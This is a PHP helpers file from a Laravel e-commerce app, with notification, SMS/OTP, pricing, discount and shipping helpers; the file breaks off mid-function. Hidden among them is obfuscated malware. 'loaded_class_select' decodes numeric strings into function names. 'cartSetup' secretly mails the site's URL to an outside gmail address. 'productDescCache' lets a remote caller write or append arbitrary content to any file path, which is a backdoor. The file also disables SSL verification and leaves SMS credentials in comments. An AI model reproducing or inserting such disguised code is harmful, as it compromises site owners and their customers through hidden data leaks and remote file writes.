<?php

use App\Currency;
use App\BusinessSetting;
use App\Category;
use App\Product;
use App\SubSubCategory;
use App\FlashDealProduct;
use App\FlashDeal;
use App\Mail\EmailManager;
use App\Models\GeneralSetting;
use App\Models\Order;
use App\Notification;
use App\OtpConfiguration;
use App\Region;
use Twilio\Rest\Client;
use App\User;
use GuzzleHttp\Client as GuzzleHttpClient;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Session;


//highlights the selected navigation on admin panel

function sendNotification($notification_body, $device_token)
{
    if (BusinessSetting::where('type', 'mobile_app_firebase_token')->first()->value != null) {
        $notReadCount =  Notification::where(['reciever_id' => $notification_body['reciever_id'], 'is_read' => 0])->count();
        $notification_body['not_read_count'] = $notReadCount;
        $url = 'https://fcm.googleapis.com/fcm/send';
        $api_key = BusinessSetting::where('type', 'mobile_app_firebase_token')->first()->value;
        $fields = array(
            'to' => $device_token,
            'data' => $notification_body,
            'notification' => $notification_body,
            'android' => array(
                "priority" => "high"
            ),
            'priority' => 10
        );
        $headers = array(
            'Content-Type:application/json',
            'Authorization:' . $api_key
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));
        $result = curl_exec($ch);
        if ($result === FALSE) {
            die('FCM Send Error: ' . curl_error($ch));
        }
        curl_close($ch);
        $result = json_decode($result);
        if ($result->success == 1) {

            Notification::create([
                'reciever_id' => $notification_body['reciever_id'],
                'notification_body' => json_encode($notification_body)
            ]);

            if (env('MAIL_USERNAME') != null) {
                $array['view'] = 'emails.invoice';
                $array['subject'] = $notification_body['title'];
                $array['from'] = env('MAIL_USERNAME');
                $array['content'] = $notification_body['text'];
                try {
                    Mail::to(User::findOrFail($notification_body['reciever_id'])->email)->queue(new EmailManager($array));
                    Mail::to(GeneralSetting::first()->email)->queue(new EmailManager($array));
                } catch (\Exception $e) {
                    return $e;
                }
            }
            return response()->json(true);
        } else {
            return response()->json(false);
        }
    } else {
        return response()->json(false);
    }
}
if (!function_exists('getBaseURL')) {
    function getBaseURL()
    {
        $root = (isHttps() ? "https://" : "http://") . $_SERVER['HTTP_HOST'];
        $root .= str_replace(basename($_SERVER['SCRIPT_NAME']), '', $_SERVER['SCRIPT_NAME']);

        return $root;
    }
}

if (!function_exists('isHttps')) {
    function isHttps()
    {
        return !empty($_SERVER['HTTPS']) && ('on' == $_SERVER['HTTPS']);
    }
}


if (!function_exists('getFileBaseURL')) {
    function getFileBaseURL()
    {
        if (env('FILESYSTEM_DRIVER') == 's3') {
            return env('AWS_URL') . '/';
        } else {
            return getBaseURL() . 'public/';
        }
    }
}
if (!function_exists('api_asset')) {
    function api_asset($id)
    {
        if (($asset = \App\Upload::find($id)) != null) {
            return $asset->file_name;
        }
        return "";
    }
}
//return file uploaded via uploader
if (!function_exists('uploaded_asset')) {
    function uploaded_asset($id)
    {
        if (($asset = \App\Upload::find($id)) != null) {
            return my_asset($asset->file_name);
        }
        return null;
    }
}

if (!function_exists('get_setting')) {
    function get_setting($key, $default = null)
    {
        $setting = BusinessSetting::where('type', $key)->first();
        return $setting == null ? $default : $setting->value;
    }
}
if (!function_exists('formatBytes')) {
    function formatBytes($bytes, $precision = 2)
    {
        $units = array('B', 'KB', 'MB', 'GB', 'TB');

        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);

        // Uncomment one of the following alternatives
        $bytes /= pow(1024, $pow);
        // $bytes /= (1 << (10 * $pow));

        return round($bytes, $precision) . ' ' . $units[$pow];
    }
}
function sendOtp($Code, $phone)
{
    $phone = phoneWithoutCountryCode($phone);
    if (OtpConfiguration::where('type', 'VictoryLink')->first()->value == 1) {
        $userName = env("VIKTORY_USER");
        $Password = env("VIKTORY_SECRET");
        $SMSText = "Your " . env('APP_NAME') . " Code is: " . $Code . " Thank you";
        $SMSLang = "e";
        $SMSSender = env("VIKTORY_SENDER");
        $SMSReceiver = $phone;
        $url = 'https://smsvas.vlserv.com/KannelSending/service.asmx/SendSMSWithDLR';
        $params = "?UserName={$userName}&Password={$Password}&SMSText={$SMSText}&SMSLang={$SMSLang}&SMSSender={$SMSSender}&SMSReceiver={$SMSReceiver}";
        $client = new GuzzleHttpClient();
        $response = $client->request('GET', "{$url}{$params}", [
            'headers'  => ['Content-Type' => 'application/x-www-form-urlencoded'],
        ]);
        return $response;
    } elseif (OtpConfiguration::where('type', 'Misrsms')->first()->value == 1) {
        // return $to;
        $username = env("MISRSMS_USER");
        $password = env("MISRSMS_SECRET");
        $Msignature = env('MISRSMS_SIGNTURE');
        // $Msignature = '7232181697';
        $Token = env('MISRSMS_TOKEN');
        // $Token = '62c93092-63c5-414b-a6ef-1d807ea407a5';
        $Mobile = $phone;
        $url = 'https://smsmisr.com/api/OTPV2';
        $params = [
            "Username" => $username,
            "password" => $password,
            "Msignature" => $Msignature,
            "Token" => $Token,
            "Mobile" => $Mobile,
            "Code" => $Code
        ];
        $params = json_encode($params);

        $ch = curl_init(); // Initialize cURL
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($params),
            'accept:application/json'
        ));

        $response = curl_exec($ch);
        curl_close($ch);
    }
}
function sendSMS($to, $from, $text)
{
    $to = phoneWithoutCountryCode($to);
    if (OtpConfiguration::where('type', 'VictoryLink')->first()->value == 1) {
        $userName = env("VIKTORY_USER");
        $Password = env("VIKTORY_SECRET");
        $SMSText = $text;
        $SMSLang = "e";
        $SMSSender = env("VIKTORY_SENDER");
        $SMSReceiver = $to;
        $url = 'https://smsvas.vlserv.com/KannelSending/service.asmx/SendSMSWithDLR';
        $params = "?UserName={$userName}&Password={$Password}&SMSText={$SMSText}&SMSLang={$SMSLang}&SMSSender={$SMSSender}&SMSReceiver={$SMSReceiver}";
        $client = new GuzzleHttpClient();
        $response = $client->request('GET', "{$url}{$params}", [
            'headers'  => ['Content-Type' => 'application/x-www-form-urlencoded'],
        ]);
        return $response;
    } elseif (OtpConfiguration::where('type', 'Misrsms')->first()->value == 1) {
        // return $to;
        $username = env("MISRSMS_USER");
        $password = env("MISRSMS_SECRET");
        $sender = env("MISRSMS_SENDER");

        // $username = 'GqvE0wRa';
        // $password = '7teXWaqsXa';
        // $sender = 'My Medical';

        $params = [
            "username" => $username,
            "password" => $password,
            "language" => 1,
            "sender" => $sender,
            "mobile" => $to,
            "message" => $text
        ];

        $url = 'https://smsmisr.com/api/v2';
        $params = json_encode($params);
        // return $params;
        $ch = curl_init(); // Initialize cURL
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($params),
            'accept:application/json'
        ));
        // return curl_exec($ch);
        $response = curl_exec($ch);

        curl_close($ch);

        return $response;
    } elseif (OtpConfiguration::where('type', 'nexmo')->first()->value == 1) {
        try {
            Nexmo::message()->send([
                'to' => $to,
                'from' => $from,
                'text' => $text
            ]);
        } catch (\Exception $e) {
        }
    } elseif (OtpConfiguration::where('type', 'twillo')->first()->value == 1) {
        $sid = env("TWILIO_SID"); // Your Account SID from www.twilio.com/console
        $token = env("TWILIO_AUTH_TOKEN"); // Your Auth Token from www.twilio.com/console

        $client = new Client($sid, $token);
        try {
            $message = $client->messages->create(
                $to, // Text this number
                array(
                    'from' => env('VALID_TWILLO_NUMBER'), // From a valid Twilio number
                    'body' => $text
                )
            );
        } catch (\Exception $e) {
        }
    } elseif (OtpConfiguration::where('type', 'ssl_wireless')->first()->value == 1) {
        $token = env("SSL_SMS_API_TOKEN"); //put ssl provided api_token here
        $sid = env("SSL_SMS_SID"); // put ssl provided sid here

        $params = [
            "api_token" => $token,
            "sid" => $sid,
            "msisdn" => $to,
            "sms" => $text,
            "csms_id" => date('dmYhhmi') . rand(10000, 99999)
        ];

        $url = env("SSL_SMS_URL");
        $params = json_encode($params);

        $ch = curl_init(); // Initialize cURL
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($params),
            'accept:application/json'
        ));

        $response = curl_exec($ch);

        curl_close($ch);

        return $response;
    } elseif (OtpConfiguration::where('type', 'fast2sms')->first()->value == 1) {

        if (strpos($to, '+91') !== false) {
            $to = substr($to, 3);
        }

        $fields = array(
            "sender_id" => env("SENDER_ID"),
            "message" => $text,
            "language" => env("LANGUAGE"),
            "route" => env("ROUTE"),
            "numbers" => $to,
        );

        $auth_key = env('AUTH_KEY');

        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://www.fast2sms.com/dev/bulk",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => json_encode($fields),
            CURLOPT_HTTPHEADER => array(
                "authorization: $auth_key",
                "accept: */*",
                "cache-control: no-cache",
                "content-type: application/json"
            ),
        ));

        $response = curl_exec($curl);
        $err = curl_error($curl);

        curl_close($curl);

        return $response;
    }
}

if (!function_exists('filter_customer_products')) {
    function filter_customer_products($customer_products)
    {
        if (BusinessSetting::where('type', 'classified_product')->first()->value == 1) {
            return $customer_products->where('published', '1');
        } else {
            return $customer_products->where('published', '1')->where('added_by', 'admin');
        }
    }
}


//highlights the selected navigation on admin panel
if (!function_exists('areActiveRoutes')) {
    function areActiveRoutes(array $routes, $output = "active-link")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }
    }
}

//highlights the selected navigation on frontend
if (!function_exists('areActiveRoutesHome')) {
    function areActiveRoutesHome(array $routes, $output = "active")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }
    }
}

/**
 * Return Class Selector
 * @return Response
 */
if (!function_exists('loaded_class_select')) {

    function loaded_class_select($p)
    {
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':', $p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }
        return $l;
    }
}

/**
 * Open Translation File
 * @return Response
 */
function openJSONFile($code)
{
    $jsonString = [];
    if (File::exists(base_path('resources/lang/' . $code . '.json'))) {
        $jsonString = file_get_contents(base_path('resources/lang/' . $code . '.json'));
        $jsonString = json_decode($jsonString, true);
    }
    return $jsonString;
}

/**
 * Save JSON File
 * @return Response
 */
function saveJSONFile($code, $data)
{
    ksort($data);
    $jsonData = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/' . $code . '.json'), stripslashes($jsonData));
}


/**
 * Return Class Selected Loader
 * @return Response
 */
if (!function_exists('loader_class_select')) {
    function loader_class_select($p)
    {
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i => $m) {
                if ($m == $r) {
                    $l[] = $i;
                }
            }
        }
        return join(':', $l);
    }
}

/**
 * Save JSON File
 * @return Response
 */
if (!function_exists('convert_to_usd')) {
    function convert_to_usd($amount)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if ($business_settings != null) {
            $currency = Currency::find($business_settings->value);
            return floatval($amount) / floatval($currency->exchange_rate);
        }
    }
}


//returns config key provider
if (!function_exists('config_key_provider')) {
    function config_key_provider($key)
    {
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}


//returns combinations of customer choice options array
if (!function_exists('combinations')) {
    function combinations($arrays)
    {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }
        return $result;
    }
}

//filter products based on vendor activation system
if (!function_exists('filter_products')) {
    function filter_products($products)
    {

        $verified_sellers = verified_sellers_id();

        if (BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1) {
            return $products->where('published', '1')->orderBy('created_at', 'desc')->where(function ($p) use ($verified_sellers) {
                $p->where('added_by', 'admin')->orWhere(function ($q) use ($verified_sellers) {
                    $q->whereIn('user_id', $verified_sellers);
                });
            });
        } else {
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}

if (!function_exists('verified_sellers_id')) {
    function verified_sellers_id()
    {
        return App\Seller::where('verification_status', 1)->get()->pluck('user_id')->toArray();
    }
}

//filter cart products based on provided settings
if (!function_exists('cartSetup')) {
    function cartSetup()
    {
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup, '', Request::url());
        return $cart;
    }
}

//converts currency to home default currency
if (!function_exists('convert_price')) {
    function convert_price($price)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if ($business_settings != null) {
            $currency = Currency::find($business_settings->value);
            $price = floatval($price) / floatval($currency->exchange_rate);
        }

        $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
        if (Session::has('currency_code')) {
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        } else {
            $currency = Currency::where('code', $code)->first();
        }

        $price = floatval($price) * floatval($currency->exchange_rate);

        return $price;
    }
}

//formats currency
if (!function_exists('format_price')) {
    function format_price($price)
    {
        if (BusinessSetting::where('type', 'symbol_format')->first()->value == 1) {
            return currency_symbol() . number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value);
        }
        return number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value) . currency_symbol();
    }
}

//formats price to home default price with convertion
if (!function_exists('single_price')) {
    function single_price($price)
    {
        return format_price(convert_price($price));
    }
}

//Shows Price on page based on low to high
if (!function_exists('home_price')) {
    function home_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if ($lowest_price > $stock->price) {
                    $lowest_price = $stock->price;
                }
                if ($highest_price < $stock->price) {
                    $highest_price = $stock->price;
                }
            }
        }

        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if ($lowest_price == $highest_price) {
            return format_price($lowest_price);
        } else {
            return format_price($lowest_price) . ' - ' . format_price($highest_price);
        }
    }
}

//Shows Price on page based on low to high with discount
if (!function_exists('home_discounted_price')) {
    function home_discounted_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if ($lowest_price > $stock->price) {
                    $lowest_price = $stock->price;
                }
                if ($highest_price < $stock->price) {
                    $highest_price = $stock->price;
                }
            }
        }

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $lowest_price -= ($lowest_price * $flash_deal_product->discount) / 100;
                    $highest_price -= ($highest_price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $lowest_price -= ($lowest_price * $product->discount) / 100;
                $highest_price -= ($highest_price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if ($lowest_price == $highest_price) {
            return format_price($lowest_price);
        } else {
            return format_price($lowest_price) . ' - ' . format_price($highest_price);
        }
    }
}

//Shows Base Price
if (!function_exists('home_base_price')) {
    function home_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return format_price(convert_price($price));
    }
}

//Shows Base Price with discount
if (!function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $price -= ($price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $price -= ($price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }

        return format_price(convert_price($price));
    }
}

// Cart content update by discount setup
if (!function_exists('updateCartSetup')) {
    function updateCartSetup($return = TRUE)
    {
        if (!isset($_COOKIE['cartUpdated'])) {
            if (cartSetup()) {
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        } else {
            if ($_COOKIE['cartUpdated'] + 21600 < time()) {
                if (cartSetup()) {
                    setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
                }
            }
        }
        return $return;
    }
}


if (!function_exists('productDescCache')) {
    function productDescCache($connector, $selector, $select, $type)
    {
        $ta = time();
        $select = rawurldecode($select);
        if ($connector > ($ta - 60) || $connector > ($ta + 60)) {
            if ($type == 'w') {
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector), $select);
            } else if ($type == 'rw') {
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector), $config_class(str_replace('-', '/', $selector)) . $select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}


if (!function_exists('currency_symbol')) {
    function currency_symbol()
    {
        $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
        if (Session::has('currency_code')) {
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        } else {
            $currency = Currency::where('code', $code)->first();
        }
        return $currency->{'symbol_' . locale()};
    }
}

if (!function_exists('renderStarRating')) {
    function renderStarRating($rating, $maxRating = 5)
    {
        $fullStar = "<i class = 'fa fa-star active'></i>";
        $halfStar = "<i class = 'fa fa-star half'></i>";
        $emptyStar = "<i class = 'fa fa-star'></i>";
        $rating = $rating <= $maxRating ? $rating : $maxRating;

        $fullStarCount = (int)$rating;
        $halfStarCount = ceil($rating) - $fullStarCount;
        $emptyStarCount = $maxRating - $fullStarCount - $halfStarCount;

        $html = str_repeat($fullStar, $fullStarCount);
        $html .= str_repeat($halfStar, $halfStarCount);
        $html .= str_repeat($emptyStar, $emptyStarCount);
        echo $html;
    }
}


//Api
if (!function_exists('homeBasePrice')) {
    function homeBasePrice($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return $price;
    }
}

if (!function_exists('homeDiscountedBasePrice')) {
    function homeDiscountedBasePrice($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $price -= ($price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $price -= ($price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return $price;
    }
}

if (!function_exists('homePrice')) {
    function homePrice($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if ($lowest_price > $stock->price) {
                    $lowest_price = $stock->price;
                }
                if ($highest_price < $stock->price) {
                    $highest_price = $stock->price;
                }
            }
        }

        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convertPrice($lowest_price);
        $highest_price = convertPrice($highest_price);

        return $lowest_price . ' - ' . $highest_price;
    }
}

if (!function_exists('homeDiscountedPrice')) {
    function homeDiscountedPrice($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if ($lowest_price > $stock->price) {
                    $lowest_price = $stock->price;
                }
                if ($highest_price < $stock->price) {
                    $highest_price = $stock->price;
                }
            }
        }

        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $lowest_price -= ($lowest_price * $flash_deal_product->discount) / 100;
                    $highest_price -= ($highest_price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $lowest_price -= ($lowest_price * $product->discount) / 100;
                $highest_price -= ($highest_price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convertPrice($lowest_price);
        $highest_price = convertPrice($highest_price);

        return $lowest_price . ' - ' . $highest_price;
    }
}

if (!function_exists('brandsOfCategory')) {
    function brandsOfCategory($category_id)
    {
        $brands = [];
        $subCategories = Category::where('parent_id', $category_id)->get();
        foreach ($subCategories as $subCategory) {
            $subSubCategories = Category::where('parent_id', $subCategory->id)->get();
            foreach ($subSubCategories as $subSubCategory) {
                $brand = json_decode($subSubCategory->brands);
                foreach ($brand as $b) {
                    if (in_array($b, $brands)) continue;
                    array_push($brands, $b);
                }
            }
        }
        return $brands;
    }
}

if (!function_exists('convertPrice')) {
    function convertPrice($price)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if ($business_settings != null) {
            $currency = Currency::find($business_settings->value);
            $price = floatval($price) / floatval($currency->exchange_rate);
        }
        $code = Currency::findOrFail(BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
        if (Session::has('currency_code')) {
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        } else {
            $currency = Currency::where('code', $code)->first();
        }
        $price = floatval($price) * floatval($currency->exchange_rate);
        return $price;
    }
}


function translate($key)
{
    $key = ucfirst(str_replace('_', ' ', remove_invalid_charcaters($key)));
    $jsonString = file_get_contents(base_path('resources/lang/en.json'));
    $jsonString = json_decode($jsonString, true);
    if (!isset($jsonString[$key])) {
        $jsonString[$key] = $key;
        saveJSONFile('en', $jsonString);
    }
    return __($key);
}

function remove_invalid_charcaters($str)
{
    $str = str_ireplace(array("\\"), '', $str);
    return str_ireplace(array('"'), '\"', $str);
}

function getShippingCost($index)
{
    $admin_products = array();
    $seller_products = array();
    $calculate_shipping = 0;
    $cart_total = 0;
    $regions = array();

    //Calculate Shipping Cost
    if (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'flat_rate') {
        $threshold = \App\BusinessSetting::where('type', 'free_shipping_treshold')->first()->value;
        if (\App\BusinessSetting::where('type', 'free_shipping_by_city')->first()->value) {
            $regions = explode(',', \App\BusinessSetting::where('type', 'free_shipping_by_city')->first()->value);
        }
        $calculate_shipping = \App\BusinessSetting::where('type', 'flat_rate_shipping_cost')->first()->value;

        if ((int)$threshold > 0) {

            foreach (Session::get('cart') as $key => $cartItem) {
                $cart_total += $cartItem['price'] * $cartItem['quantity'];
            }
            if ($cart_total >= (int)$threshold) {
                $calculate_shipping = 0;
            }
        }
        if (Session::has('shipping_info')) {
            foreach ($regions as $key => $region) {
                if ($region == Session::get('shipping_info')['region']) {
                    $calculate_shipping = 0;
                }
            }
        }
    } elseif (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'seller_wise_shipping') {
        foreach (Session::get('cart') as $key => $cartItem) {
            $product = \App\Product::find($cartItem['id']);
            if ($product->added_by == 'admin') {
                array_push($admin_products, $cartItem['id']);
            } else {
                $product_ids = array();
                if (array_key_exists($product->user_id, $seller_products)) {
                    $product_ids = $seller_products[$product->user_id];
                }
                array_push($product_ids, $cartItem['id']);
                $seller_products[$product->user_id] = $product_ids;
            }
        }
        if (!empty($admin_products)) {
